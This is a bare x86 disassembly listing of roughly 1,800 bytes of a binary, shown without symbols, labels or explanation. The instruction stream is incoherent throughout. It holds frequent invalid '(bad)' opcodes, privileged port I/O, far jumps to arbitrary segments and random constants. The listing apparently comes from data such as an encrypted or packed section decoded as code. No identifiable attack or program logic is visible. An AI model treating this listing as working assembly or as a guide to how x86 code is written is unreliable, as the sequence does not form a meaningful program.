  418d98:	ret    0xb938
  418d9b:	lods   eax,DWORD PTR ds:[esi]
  418d9c:	mov    edx,0x59a6c348
  418da1:	fwait
  418da2:	icebp  
  418da3:	mov    ?,WORD PTR [edi-0x62]
  418da6:	sahf   
  418da7:	in     al,dx
  418da8:	or     al,0x54
  418daa:	jne    0x418d93
  418dac:	mov    DWORD PTR [edx],edx
  418dae:	sbb    ecx,ecx
  418db0:	loopne 0x418dd9
  418db2:	pop    esi
  418db3:	fisttp DWORD PTR [ebp+0x1c099c8c]
  418db9:	repz test BYTE PTR [edx-0x49],ah
  418dbd:	jbe    0x418d88
  418dbf:	mov    bl,0xf
  418dc1:	mov    al,ds:0x328310d7
  418dc6:	mov    esi,0x3821ecce
  418dcb:	mov    eax,ds:0x8e72e66d
  418dd0:	pop    es
  418dd1:	bound  ebx,QWORD PTR [ecx-0x13]
  418dd4:	mov    esp,0xfa1fe003
  418dd9:	dec    edi
  418dda:	dec    BYTE PTR ds:0xda198501
  418de0:	mov    cl,0x87
  418de2:	mov    cl,0x6b
  418de4:	loope  0x418d9d
  418de6:	shl    BYTE PTR [edi+0x20],cl
  418de9:	pop    eax
  418dea:	cwde   
  418deb:	shl    DWORD PTR ds:0x40922ff6,cl
  418df1:	popa   
  418df2:	lahf   
  418df3:	jo     0x418ddc
  418df5:	pop    esi
  418df6:	cld    
  418df7:	aas    
  418df8:	mov    ah,0x5f
  418dfa:	xchg   edi,eax
  418dfb:	pop    esp
  418dfc:	adc    BYTE PTR [ebp-0x12],0x7
  418e00:	cld    
  418e01:	inc    eax
  418e02:	sub    BYTE PTR [edx+0x44],dh
  418e05:	push   0xaaaa32f7
  418e0a:	mov    al,ds:0x6397c4a5
  418e0f:	outs   dx,DWORD PTR ds:[esi]
  418e10:	aam    0x23
  418e12:	fld    QWORD PTR [edx+0x73bdb1c6]
  418e18:	cmp    DWORD PTR [ecx],0x3036c005
  418e1e:	in     al,dx
  418e1f:	leave  
  418e20:	jb     0x418e51
  418e22:	arpl   WORD PTR [edx+0x3a2f87aa],di
  418e28:	sub    al,BYTE PTR [ecx-0x22]
  418e2b:	fmul   DWORD PTR [edi-0x5c]
  418e2e:	(bad)  
  418e2f:	loope  0x418deb
  418e31:	ficom  DWORD PTR [ebx+0x7e4f8f87]
  418e37:	xor    eax,0x4f6e32f
  418e3c:	and    ah,BYTE PTR [esp+ebx*1]
  418e3f:	in     al,dx
  418e40:	mov    gs,WORD PTR [edx]
  418e42:	inc    esp
  418e43:	and    eax,0xc512e55a
  418e48:	push   cs
  418e49:	inc    edi
  418e4a:	dec    esp
  418e4b:	loop   0x418e30
  418e4d:	jo     0x418e93
  418e4f:	outs   dx,DWORD PTR ds:[esi]
  418e50:	add    eax,0x7943434a
  418e55:	fucom  st(3)
  418e57:	test   al,0xb8
  418e59:	adc    eax,0x7d8ad4f6
  418e5e:	cmp    bl,BYTE PTR [ecx]
  418e60:	xchg   esp,eax
  418e61:	retf   
  418e62:	inc    edi
  418e63:	dec    ebp
  418e64:	mov    dh,0x80
  418e66:	outs   dx,DWORD PTR ds:[esi]
  418e67:	in     al,0xdb
  418e69:	bnd jns 0x418e24
  418e6c:	loope  0x418ea7
  418e6e:	dec    ecx
  418e6f:	ja     0x418e7b
  418e71:	pop    esp
  418e72:	mov    al,ds:0x33594b1e
  418e77:	int    0x53
  418e79:	dec    ecx
  418e7a:	pop    esp
  418e7b:	(bad)  
  418e7d:	jae    0x418ee8
  418e7f:	je     0x418edf
  418e81:	mov    edi,DWORD PTR [ecx-0x64f0b478]
  418e87:	mov    bh,0xb8
  418e89:	push   ebx
  418e8a:	sbb    BYTE PTR [eax+0x77],dh
  418e8d:	addr16 into 
  418e8f:	ins    BYTE PTR es:[edi],dx
  418e90:	leave  
  418e91:	jle    0x418e47
  418e93:	sbb    cl,BYTE PTR [eax+0x2240c8eb]
  418e99:	jo     0x418e60
  418e9b:	jecxz  0x418e84
  418e9d:	mov    esi,edx
  418e9f:	pop    ebp
  418ea0:	iretw  
  418ea2:	test   DWORD PTR [edx+0x3],0x383728b2
  418ea9:	ds or  eax,0xf4bc33cd
  418eaf:	jecxz  0x418ec1
  418eb1:	dec    esi
  418eb2:	int    0x88
  418eb4:	ret    0x1570
  418eb7:	ficom  WORD PTR [ebx-0x1f3e9fd3]
  418ebd:	pushf  
  418ebe:	mov    esi,0xa086648e
  418ec3:	mov    BYTE PTR ds:0xdb2c49bc,dh
  418ec9:	or     eax,0x2ffdfe1c
  418ece:	dec    edx
  418ecf:	jno    0x418f49
  418ed1:	xchg   edx,eax
  418ed2:	pusha  
  418ed3:	xchg   edi,eax
  418ed4:	sub    eax,0xcabd7bcd
  418ed9:	test   al,0xa1
  418edb:	xor    ch,BYTE PTR [edi-0x4]
  418ede:	in     eax,dx
  418edf:	enter  0xb7e,0x62
  418ee3:	cmp    ebx,ebp
  418ee5:	aas    
  418ee6:	add    DWORD PTR [edi-0x4ee76795],eax
  418eec:	or     ebx,eax
  418eee:	jae    0x418e76
  418ef0:	sbb    dl,BYTE PTR [ebx+0x758f5c3a]
  418ef6:	hlt    
  418ef7:	sahf   
  418ef8:	pop    eax
  418ef9:	shl    edx,1
  418efb:	test   al,0x9
  418efd:	fwait
  418efe:	push   esp
  418eff:	jnp    0x418ef8
  418f01:	cmp    eax,0xdbb7cdc3
  418f06:	pop    eax
  418f07:	xchg   esi,eax
  418f09:	xchg   esi,eax
  418f0a:	test   DWORD PTR [esi+eiz*4+0x45],0xa7a251ec
  418f12:	gs js  0x418e99
  418f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f16:	mov    edi,0x75e6c441
  418f1b:	or     BYTE PTR ds:0xac25e541,0xfe
  418f22:	(bad)  
  418f23:	in     al,0x7c
  418f25:	sbb    dh,BYTE PTR [ebx+ebp*2+0x38]
  418f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f2a:	(bad)
  418f2e:	(bad)  
  418f2f:	unpcklps xmm0,XMMWORD PTR [esi+ebp*8+0x7b]
  418f34:	jmp    0xbff02a2a
  418f39:	fisub  DWORD PTR [edi]
  418f3b:	or     al,BYTE PTR [eax]
  418f3d:	shr    DWORD PTR [ebx],1
  418f3f:	aad    0x90
  418f41:	(bad)  
  418f42:	jmp    0x418ef7
  418f44:	pop    edx
  418f45:	mov    dl,0x60
  418f47:	and    DWORD PTR [edi],esi
  418f49:	popa   
  418f4a:	jae    0x418faa
  418f4c:	jae    0x418f2c
  418f4e:	push   ecx
  418f4f:	cli    
  418f50:	cmp    al,0x9
  418f52:	nop
  418f53:	xor    BYTE PTR [esi+0x201d8737],cl
  418f59:	(bad)  
  418f5a:	(bad)  
  418f5b:	mov    ecx,0x4d4d7a71
  418f60:	out    dx,eax
  418f61:	mov    ebx,eax
  418f63:	jl     0x418fa8
  418f65:	pop    ds
  418f66:	jo     0x418f57
  418f68:	xor    eax,0xe690cd51
  418f6d:	sub    cl,ch
  418f6f:	sti    
  418f70:	sbb    eax,0x77881f22
  418f75:	mov    ds:0xd9d43daa,al
  418f7a:	mov    ds:0xfdbafe0,eax
  418f7f:	add    edi,DWORD PTR [edi+0x14ea18db]
  418f85:	sub    eax,0x9a23eb1c
  418f8a:	mov    cl,ch
  418f8c:	push   esp
  418f8d:	retf   
  418f8e:	jns    0x418f65
  418f90:	push   esi
  418f91:	test   DWORD PTR [edi-0x35],esi
  418f94:	inc    esi
  418f95:	sti    
  418f96:	ss mov ebx,0x872ee992
  418f9c:	push   edx
  418f9d:	mov    ah,0x23
  418f9f:	loope  0x41901d
  418fa1:	xchg   ecx,eax
  418fa2:	add    BYTE PTR [edx-0x488d1b7b],0x41
  418fa9:	repnz push es
  418fab:	cmp    BYTE PTR [edx],0x12
  418fae:	jmp    0x418f45
  418fb0:	cmp    ch,dh
  418fb2:	test   BYTE PTR [ebx-0x5a],ah
  418fb5:	in     eax,0x53
  418fb7:	in     al,0xf9
  418fb9:	sbb    BYTE PTR [eax+eax*2+0x3e],0x94
  418fbe:	inc    edi
  418fbf:	mov    dh,0xdd
  418fc1:	mov    cl,BYTE PTR [ebx+0x59a76895]
  418fc7:	cwde   
  418fc8:	dec    edx
  418fc9:	sbb    DWORD PTR [eax-0x12],esi
  418fcc:	popf   
  418fcd:	outs   dx,DWORD PTR ds:[esi]
  418fce:	and    DWORD PTR [edx+0x3fad2437],ecx
  418fd4:	cmp    esp,DWORD PTR [esi+esi*4]
  418fd7:	mov    esp,0xa50e9fed
  418fdc:	push   esp
  418fdd:	stos   BYTE PTR es:[edi],al
  418fde:	jl     0x41903b
  418fe0:	popa   
  418fe1:	pop    esi
  418fe2:	out    0xa6,eax
  418fe4:	popa   
  418fe5:	add    bh,ch
  418fe7:	addr16 xchg edi,eax
  418fe9:	div    DWORD PTR [ecx+0x4c]
  418fec:	mov    DWORD PTR [esp+ecx*1-0x225a2c58],esp
  418ff3:	aad    0x75
  418ff5:	loopne 0x418faf
  418ff7:	repz das 
  418ff9:	adc    edi,0x77
  418ffc:	xor    esp,DWORD PTR ds:0xe3ecdc4e
  419002:	std    
  419003:	stos   BYTE PTR es:[edi],al
  419004:	mov    ecx,0x247271b0
  419009:	add    eax,0x929defb2
  41900e:	inc    ebp
  41900f:	data16 mov al,BYTE PTR [esi+eax*8-0x68d584ec]
  419017:	dec    edx
  419018:	(bad)  
  41901b:	jae    0x418fb9
  41901d:	ds mov dl,0x31
  419020:	fwait
  419021:	push   es
  419022:	sub    dh,BYTE PTR [eax]
  419024:	daa    
  419025:	add    DWORD PTR [esi],0xa41fe800
  41902b:	push   ss
  41902c:	adc    DWORD PTR [eax+eax*8+0x1461661c],ecx
  419033:	scas   eax,DWORD PTR es:[edi]
  419034:	or     al,0xad
  419036:	dec    edi
  419037:	daa    
  419038:	sbb    eax,0x43f09e45
  41903d:	add    DWORD PTR [ecx],esp
  41903f:	sub    al,0xb0
  419041:	xchg   ecx,eax
  419042:	sbb    DWORD PTR [eax],eax
  419044:	push   esp
  419045:	adc    esi,DWORD PTR [ebp-0x49095c31]
  41904b:	lock sub BYTE PTR [ebx+0x41],bh
  41904f:	xor    DWORD PTR [edi-0x69479400],0x35dcc472
  419059:	into   
  41905a:	out    0x1d,al
  41905c:	jge    0x419097
  41905e:	rcr    BYTE PTR [ebx-0x1afa45c5],cl
  419064:	mov    eax,0xfc6cad47
  419069:	mov    ah,BYTE PTR [edx+0x39cf1309]
  41906f:	fwait
  419070:	adc    al,BYTE PTR [edx-0x163ceab]
  419076:	xchg   esp,eax
  419077:	ja     0x419001
  419079:	inc    edi
  41907a:	mov    esi,0xfb94664d
  41907f:	and    eax,0xca720a77
  419084:	fcom   DWORD PTR [eax]
  419086:	xor    DWORD PTR [esi+0x18b07e91],esp
  41908c:	fwait
  41908d:	test   BYTE PTR [ecx],ah
  41908f:	icebp  
  419090:	sub    ch,0xf8
  419093:	adc    esi,DWORD PTR [esi-0x77]
  419096:	into   
  419097:	lea    ecx,[eax+0x33bca51a]
  41909d:	sub    bh,al
  41909f:	outs   dx,BYTE PTR ds:[esi]
  4190a0:	loope  0x41910c
  4190a2:	leave  
  4190a3:	dec    ebp
  4190a4:	adc    eax,0xb772b197
  4190a9:	mov    edi,0x832d2f95
  4190ae:	loopne 0x4190da
  4190b0:	jl     0x4190a8
  4190b2:	pop    es
  4190b3:	dec    edi
  4190b4:	push   ds
  4190b5:	loope  0x419080
  4190b7:	lods   al,BYTE PTR ds:[esi]
  4190b8:	pusha  
  4190b9:	lods   al,BYTE PTR ds:[esi]
  4190ba:	outs   dx,DWORD PTR ds:[esi]
  4190bb:	cli    
  4190bc:	cld    
  4190bd:	dec    edi
  4190be:	enter  0x3a71,0x98
  4190c2:	(bad)  
  4190c3:	and    bh,BYTE PTR [ebx]
  4190c5:	jmp    0xd9f91805
  4190ca:	xor    eax,0xc6c4f3b9
  4190cf:	ficom  DWORD PTR [edx]
  4190d1:	fucomip st,st(6)
  4190d3:	add    dh,bl
  4190d5:	ficomp WORD PTR [edi-0x39035868]
  4190db:	pop    es
  4190dc:	xchg   DWORD PTR [eax+0x3994704b],esi
  4190e2:	dec    edx
  4190e3:	or     ah,0xd5
  4190e6:	mov    cl,0x66
  4190e8:	pop    edx
  4190e9:	cmc    
  4190ea:	xor    ch,BYTE PTR gs:[eax+edx*8+0x42]
  4190ef:	or     DWORD PTR [edx],ebx
  4190f1:	fs inc ebp
  4190f3:	mov    WORD PTR [eax],?
  4190f5:	cdq    
  4190f6:	rcl    DWORD PTR [eax-0x2e],cl
  4190f9:	popf   
  4190fa:	mov    esi,0x2bf49ea0
  4190ff:	sbb    ebp,eax
  419101:	sbb    ebx,DWORD PTR ds:0x4061e053
  419107:	pop    esi
  419108:	dec    esp
  419109:	mov    WORD PTR [esi+ebx*2+0x2e],cs
  41910d:	and    dh,BYTE PTR [edi]
  41910f:	mov    eax,ds:0x59e19992
  419114:	cli    
  419115:	xchg   ebp,eax
  419116:	xchg   edi,eax
  419117:	fwait
  419118:	sbb    DWORD PTR [ebx+eiz*1+0x20],edx
  41911c:	xor    dl,dh
  41911e:	sub    eax,0x66b76dc2
  419123:	push   cs
  419124:	push   eax
  419125:	mov    ebx,0xb37bd505
  41912a:	push   esp
  41912b:	inc    esi
  41912c:	or     ebp,DWORD PTR [edx]
  41912e:	mov    bl,0xbc
  419130:	es pop ds
  419132:	sub    dh,BYTE PTR [ebx-0x34359770]
  419138:	inc    eax
  419139:	retf   0x4850
  41913c:	fnstsw WORD PTR [ecx-0x15ca22d6]
  419142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419143:	out    0x21,eax
  419145:	or     BYTE PTR [eax+edx*2-0x7bdf5f8],dl
  41914c:	stos   BYTE PTR es:[edi],al
  41914d:	bound  ebx,QWORD PTR [esi-0xb]
  419150:	inc    eax
  419151:	(bad)  
  419152:	cli    
  419153:	mov    WORD PTR [ebp-0x3371d51c],es
  419159:	(bad)  
  41915a:	cmc    
  41915b:	mov    edx,0xc37e4ef6
  419160:	cmp    bl,bl
  419162:	aam    0x4f
  419164:	shl    BYTE PTR [ecx+0x79],0x23
  419168:	inc    esp
  419169:	aad    0x6b
  41916b:	clc    
  41916c:	lahf   
  41916d:	xchg   ebp,eax
  41916e:	adc    bh,BYTE PTR [esi-0x1e]
  419171:	sub    eax,0x254fc8e7
  419176:	pusha  
  419177:	jge    0x4191d0
  419179:	(bad)  
  41917a:	clc    
  41917b:	pop    ds
  41917c:	mov    DWORD PTR [ebx+0x7899debd],edi
  419182:	sti    
  419183:	mov    ah,0x23
  419185:	outs   dx,DWORD PTR ds:[esi]
  419186:	mov    edi,0x76cf3882
  41918b:	fdivr  QWORD PTR [ebx+0x61]
  41918e:	pop    esp
  41918f:	imul   ecx,DWORD PTR [eax+0x6d],0x203129c8
  419196:	in     eax,0x53
  419198:	enter  0x7104,0xbb
  41919c:	stos   BYTE PTR es:[edi],al
  41919d:	scas   eax,DWORD PTR es:[edi]
  41919e:	pop    ecx
  41919f:	dec    ecx
  4191a0:	and    eax,0x7f15f28
  4191a5:	fcom   DWORD PTR [eax]
  4191a7:	xchg   BYTE PTR [ebx+ebx*8-0x3526d76c],bl
  4191ae:	mov    ebx,0xca3c4c1d
  4191b3:	mov    esp,DWORD PTR [eax-0x33]
  4191b6:	fistp  WORD PTR [esi+0xf]
  4191b9:	or     al,0xe0
  4191bb:	sbb    al,0x63
  4191bd:	out    0x5,al
  4191bf:	cmp    cl,cl
  4191c1:	adc    al,0x1d
  4191c3:	loope  0x419212
  4191c5:	add    ch,BYTE PTR [esi+ebx*8+0x37]
  4191c9:	or     DWORD PTR [ebx],esp
  4191cb:	lahf   
  4191cc:	mov    cl,0xb5
  4191ce:	outs   dx,BYTE PTR ds:[si]
  4191d0:	cmp    eax,0x8082140d
  4191d5:	cli    
  4191d6:	pop    ebp
  4191d7:	mov    bl,0x3
  4191d9:	or     al,BYTE PTR [esi+ebp*8-0x6f5caaf6]
  4191e0:	mov    ebx,0x7e225f73
  4191e5:	iret   
  4191e6:	mov    WORD PTR [ebp+0x7bcde8aa],cs
  4191ec:	pop    edx
  4191ed:	xchg   edi,eax
  4191ee:	imul   eax,ebp,0xffffffbc
  4191f1:	jecxz  0x419229
  4191f3:	lahf   
  4191f4:	sbb    esi,esp
  4191f6:	jae    0x4191d4
  4191f8:	fisttp DWORD PTR ds:0x13599769
  4191fe:	pushf  
  4191ff:	ins    DWORD PTR es:[edi],dx
  419200:	push   ss
  419201:	dec    edi
  419202:	cs (bad) 
  419204:	jo     0x4191cd
  419206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419207:	xchg   ecx,eax
  419208:	into   
  419209:	lahf   
  41920a:	into   
  41920b:	cs rcr ah,0x2
  41920f:	aad    0x60
  419211:	sbb    DWORD PTR [edx+edx*1-0x738e468b],esi
  419218:	in     al,0x9f
  41921a:	adc    DWORD PTR [ecx+0x772ea208],ebp
  419220:	in     al,dx
  419221:	xor    DWORD PTR [ebx],edx
  419223:	adc    ebx,DWORD PTR [eax-0x51]
  419226:	rcl    DWORD PTR [ebx],cl
  419228:	ins    BYTE PTR es:[edi],dx
  419229:	popf   
  41922a:	jl     0x4191f7
  41922c:	xchg   cl,dl
  41922e:	popf   
  41922f:	pop    ecx
  419230:	add    bh,0x1
  419233:	idiv   DWORD PTR [eax+0x5981ff66]
  419239:	idiv   ecx
  41923b:	add    ah,cl
  41923d:	pop    ecx
  41923e:	push   cs
  41923f:	cmc    
  419240:	pop    ecx
  419241:	out    dx,eax
  419242:	adc    BYTE PTR [ebp+eax*2-0x58],al
  419246:	fbstp  TBYTE PTR [edi-0x3149ff0f]
  41924c:	mov    ch,0xdb
  41924e:	lahf   
  41924f:	add    BYTE PTR [edx-0x1a8c35bd],ch
  419255:	pushf  
  419256:	push   ecx
  419257:	sbb    eax,0xbeb28425
  41925c:	jge    0x4192cc
  41925e:	jns    0x4192d3
  419260:	push   ax
  419262:	popf   
  419263:	outs   dx,DWORD PTR ds:[esi]
  419264:	sbb    BYTE PTR [edi-0x51],ch
  419267:	cli    
  419268:	out    dx,eax
  419269:	mov    eax,0x4ccada67
  41926e:	adc    eax,DWORD PTR [edi-0x400e40ff]
  419274:	ror    BYTE PTR [edx-0x1a2dd149],cl
  41927a:	add    ecx,esi
  41927c:	int3   
  41927d:	and    DWORD PTR [ebx],ecx
  41927f:	(bad)  [edi+0x58]
  419282:	mov    dh,0xe6
  419284:	adc    BYTE PTR [edi-0x56bd7b6d],bl
  41928a:	fld    TBYTE PTR [edx]
  41928c:	cs test al,0x3b
  41928f:	sbb    DWORD PTR [eax+0x42c9c45c],edi
  419295:	pop    eax
  419296:	ret    0x6da3
  419299:	fsub   QWORD PTR [ebx+0x4f]
  41929c:	or     al,0xc0
  41929e:	ret    
  41929f:	mov    al,ds:0xb52d3302
  4192a4:	shl    edi,cl
  4192a6:	jns    0x4192ba
  4192a8:	fisubr WORD PTR [ebx+0x2dab36d]
  4192ae:	or     eax,0x8ad2eb29
  4192b3:	adc    eax,0x89c673e2
  4192b8:	adc    dl,BYTE PTR [ecx]
  4192ba:	hlt    
  4192bb:	cmp    DWORD PTR [edi+0x7a],ebx
  4192be:	mov    cs,WORD PTR [esi-0x6f]
  4192c1:	push   esp
  4192c2:	jno    0x419317
  4192c4:	into   
  4192c5:	xchg   ecx,eax
  4192c6:	xor    eax,0xe7d87cef
  4192cb:	sahf   
  4192cc:	adc    DWORD PTR [edx+0x77],esi
  4192cf:	dec    edi
  4192d0:	sub    al,0x76
  4192d2:	inc    ebx
  4192d3:	pop    esi
  4192d4:	jno    0x4192ba
  4192d6:	sub    edx,esi
  4192d8:	mov    esi,0xb1d2c8d1
  4192dd:	mov    edx,0x25bb82c9
  4192e2:	lahf   
  4192e3:	mov    eax,0x9b6eb79d
  4192e8:	pop    ss
  4192e9:	enter  0xfc0d,0x66
  4192ed:	sbb    ah,BYTE PTR [esi+0x4e]
  4192f0:	jb     0x419363
  4192f2:	(bad)  
  4192f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f4:	sub    edi,DWORD PTR [ecx-0x7717f68a]
  4192fa:	pusha  
  4192fb:	or     dh,bl
  4192fd:	pop    esp
  4192fe:	inc    esi
  4192ff:	push   ss
  419300:	or     edi,DWORD PTR [ebp+0x2dd1fc1d]
  419306:	out    dx,eax
  419307:	xchg   BYTE PTR [ecx],bl
  419309:	mov    DWORD PTR [edi],edi
  41930b:	inc    eax
  41930c:	mov    edx,0xfc294b39
  419311:	test   eax,0xa46da98e
  419316:	aaa    
  419317:	outs   dx,BYTE PTR ds:[esi]
  419318:	adc    ah,BYTE PTR [eax-0x5d17a681]
  41931e:	adc    ch,BYTE PTR [edi-0x358c3338]
  419324:	data16 mov ss,WORD PTR [ebx-0x23]
  419328:	pop    ss
  419329:	nop
  41932a:	in     eax,dx
  41932b:	lea    edx,[edx-0x79]
  41932e:	ret    
  41932f:	push   0xffffff82
  419331:	cld    
  419332:	mul    DWORD PTR [esi-0x59edd778]
  419338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419339:	pop    ecx
  41933a:	and    eax,0xfe9f64d6
  41933f:	pop    es
  419340:	add    dh,BYTE PTR [edx*2-0x353b21e]
  419347:	test   al,0x29
  419349:	out    dx,al
  41934a:	xor    BYTE PTR [edi+0x7f7dc897],bl
  419350:	xor    al,0xa4
  419352:	inc    ecx
  419353:	add    cl,BYTE PTR [edx-0x2e31ea9e]
  419359:	cs sub eax,0x68b34307
  41935f:	fnstenv [eax-0x3c3e5c6c]
  419365:	add    esi,DWORD PTR [ecx+edi*8]
  419368:	xor    BYTE PTR [ecx],ch
  41936a:	dec    edx
  41936b:	xor    dl,cl
  41936d:	aaa    
  41936e:	xchg   esp,eax
  41936f:	jmp    0x41930e
  419371:	push   0x9e5ee374
  419376:	mov    esp,0x7244dde5
  41937b:	ret    
  41937c:	mov    BYTE PTR [edi+0x6a],al
  41937f:	sub    esp,DWORD PTR [ecx]
  419381:	mov    dl,0x34
  419383:	lahf   
  419384:	test   DWORD PTR [edx],ebp
  419386:	repnz out dx,eax
  419388:	call   0x970ccefc
  41938d:	adc    ah,al
  41938f:	test   dl,ah
  419391:	jo     0x41931c
  419393:	mov    edx,0xfa752c96
  419398:	popa   
  419399:	gs ret 
  41939b:	adc    ah,bl
  41939d:	cmp    eax,0x854d2e1
  4193a2:	imul   edi,ebp,0xffffffa9
  4193a5:	pop    ds
  4193a6:	pushf  
  4193a7:	cmp    al,0x34
  4193a9:	inc    eax
  4193aa:	pop    ds
  4193ab:	leave  
  4193ac:	xchg   esp,eax
  4193ad:	(bad)  
  4193ae:	clc    
  4193af:	aam    0x4e
  4193b1:	jmp    0x62a470a9
  4193b6:	stc    
  4193b7:	ja     0x41937e
  4193b9:	add    eax,DWORD PTR [eax+0x3f]
  4193bc:	jne    0x41934f
  4193be:	addr16 int3 
  4193c0:	cmc    
  4193c1:	or     eax,0x2501bbd2
  4193c6:	mov    dl,0xef
  4193c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c9:	shl    DWORD PTR [esi],0x2c
  4193cc:	cmp    al,BYTE PTR [edx-0x19]
  4193cf:	inc    edx
  4193d0:	mov    esp,0xe9638415
  4193d5:	sub    dh,BYTE PTR [ecx]
  4193d7:	xchg   ecx,eax
  4193d8:	popa   
  4193d9:	test   eax,0xdc2cdc7
  4193de:	jae    0x419420
  4193e0:	mov    al,ds:0x5ce4d2a1
  4193e5:	xor    DWORD PTR [ebp+0x7e],eax
  4193e8:	(bad)  
  4193e9:	xor    dl,BYTE PTR [ecx+0x6bef0f34]
  4193ef:	sbb    esi,ecx
  4193f1:	mov    ebp,0x12b9abb9
  4193f6:	pop    ecx
  4193f7:	sbb    al,BYTE PTR [esi-0x6eac1d3c]
  4193fd:	mov    al,0x50
  4193ff:	inc    ecx
  419400:	icebp  
  419401:	inc    eax
  419402:	div    BYTE PTR [edi+0x59d54bcc]
  419408:	cmp    al,0x42
  41940a:	and    bl,dl
  41940c:	mov    bh,0x8e
  41940e:	std    
  41940f:	test   DWORD PTR [esi],edi
  419411:	and    al,0x69
  419413:	pop    eax
  419414:	pop    ebp
  419415:	mov    ecx,0xe85e6a5d
  41941a:	test   DWORD PTR [esi-0x5a],edx
  41941d:	and    ch,ah
  41941f:	add    al,0xca
  419421:	adc    al,0xa8
  419423:	out    dx,al
  419424:	adc    eax,edx
  419426:	mov    eax,ds:0xcd0cc8a7
  41942b:	jbe    0x419458
  41942d:	idiv   DWORD PTR [esi]
  41942f:	data16 fucomp st(3)
  419432:	mov    bh,0xac
  419434:	sub    eax,0x7b73b39d
  419439:	mov    bl,0xe5
  41943b:	shl    BYTE PTR ds:0xeaaf55b5,cl
  419441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419442:	fwait
  419443:	adc    DWORD PTR [ebx+0x4a],ecx
  419446:	in     al,dx
  419447:	jnp    0x4193cb
  419449:	ret    
  41944a:	test   esp,edi
  41944c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41944d:	jne    0x41943f
  41944f:	mov    bl,0xb6
  419451:	jmp    0xda8c:0x54085cf7
  419458:	mov    edx,DWORD PTR [edx]
  41945a:	retf   
  41945b:	pcmpgtw mm4,QWORD PTR [esi+0x20]
  41945f:	inc    edx
  419460:	xchg   esi,eax
  419461:	sub    DWORD PTR [ebx+0x4aa3cd6],edi
  419467:	dec    edx
  419468:	pop    ss
  419469:	jo     0x41943f
  41946b:	scas   al,BYTE PTR es:[edi]
  41946c:	cmp    bl,0x98
  41946f:	aaa    
  419470:	retf   0x2010
  419473:	jl     0x419423
  419475:	daa    
  419476:	mov    dh,0x80
  419478:	imul   eax,DWORD PTR [eax+0x51],0x2a767a05
  41947f:	cmp    al,0xfc
  419481:	lahf   
  419482:	lods   al,BYTE PTR ds:[esi]
  419483:	mov    ecx,edi
  419485:	pop    esp
  419486:	jbe    0x419479
  419488:	idiv   dh
  41948a:	inc    edx
  41948b:	test   BYTE PTR [esi*8-0x5625a26],dl
  419492:	sbb    al,BYTE PTR [esi]
  419494:	mov    eax,0xc14adf49
  419499:	mov    edx,0x18ecc4c7
  41949e:	jnp    0x419459
  4194a0:	dec    esi
  4194a1:	fadd   DWORD PTR [edi+0x1f2fda87]
  4194a7:	not    BYTE PTR [edi+0x4]
  4194aa:	push   edx
  4194ab:	pusha  
  4194ac:	stos   BYTE PTR es:[edi],al
  4194ad:	dec    ebp
  4194ae:	(bad)  
  4194af:	sti    
  4194b0:	imul   eax,DWORD PTR [ebx],0xffffffb3
  4194b3:	popf   
  4194b4:	mov    ah,0x8
  4194b6:	es out 0x5a,eax
  4194b9:	sub    esp,esp
  4194bb:	jmp    eax
  4194bd:	sti    
  4194be:	sbb    bh,al
  4194c0:	mov    ch,0x26
  4194c2:	iret   
  4194c3:	or     DWORD PTR [eax+0x6],ecx
  4194c6:	mov    edi,?
  4194c8:	and    al,BYTE PTR [ecx+0x3e425287]
  4194ce:	nop
  4194cf:	arpl   WORD PTR [ebx-0x6ad57c18],bp
  4194d5:	out    dx,eax
  4194d6:	test   al,0xc
  4194d8:	or     eax,0x755cf93c
  4194dd:	xchg   edi,eax
  4194de:	fldenv [edi-0x2376cfb5]
  4194e4:	jmp    0xe651:0x75c6438c
  4194eb:	out    dx,al
  4194ec:	sub    al,0x7f
  4194ee:	les    esp,FWORD PTR cs:[ebx-0x73da2e3f]
  4194f5:	mov    es,edx
  4194f7:	mov    DWORD PTR [edx+ecx*2],esi
  4194fa:	retf   0x100c
  4194fd:	imul   edx,DWORD PTR [ebx],0x30
  419500:	sub    al,BYTE PTR [edx+ebp*4]
  419503:	xchg   esi,eax
  419504:	(bad)  
  419505:	out    0x75,al
  419507:	sbb    DWORD PTR [ecx+0x4e2ac0b0],ecx
  41950d:	push   ebx
  41950e:	xor    edx,edi
  419510:	mov    esp,0x332205ef
  419515:	out    dx,eax
  419516:	pop    esp
  419517:	iret   
  419518:	adc    al,0x9f
  41951a:	sub    BYTE PTR [eax+0x48dd6b14],0x93
  419521:	jo     0x419517
  419523:	les    esi,FWORD PTR [edi+0xb37bee1]
  419529:	and    ebp,DWORD PTR [edi-0x71]
  41952c:	or     DWORD PTR [eax*4+0x685d49e],esp
  419533:	in     eax,dx
  419534:	mov    ah,BYTE PTR es:[edi-0x57]
  419538:	push   edi
  419539:	xchg   ebp,eax
  41953a:	call   0x5988:0x66ddc391
  419541:	mov    WORD PTR ds:0xf6028604,fs
  419547:	iret   
  419548:	dec    esi
  419549:	add    DWORD PTR [edi-0x47],edx
  41954c:	je     0x4195bf
  41954e:	in     al,0x92
  419550:	leave  
  419551:	sbb    dh,BYTE PTR [edx-0x27bd7863]
  419557:	add    esi,DWORD PTR [ecx+0x72]
  41955a:	mov    edx,0x2b7835fb
  41955f:	mov    edi,0xe0c72f8a
  419564:	call   0xdaac:0x4e69fa70
  41956b:	mov    bl,dl
  41956d:	mov    esp,0xbf119424
  419572:	fidiv  DWORD PTR [ecx-0x56]
  419575:	ja     0x41954b
  419577:	add    eax,0xd0445b6d
  41957c:	dec    esi
  41957d:	pop    esi
  41957e:	jp     0x41959d
  419580:	xor    al,0xda
  419582:	sar    DWORD PTR [ebx+ebp*1-0x71cccf08],cl
  419589:	cmp    al,0xad
  41958b:	adc    dh,BYTE PTR [eax-0x5dfd2ce6]
  419591:	mov    esi,0x65fb44fe
  419596:	(bad)  [ebp-0x3c]
  419599:	xchg   edx,eax
  41959a:	pop    ds
  41959b:	enter  0xec26,0xf6
  41959f:	cld    
  4195a0:	add    al,0xac
  4195a2:	push   0x222e9154
  4195a7:	add    eax,DWORD PTR [edi-0x1f]
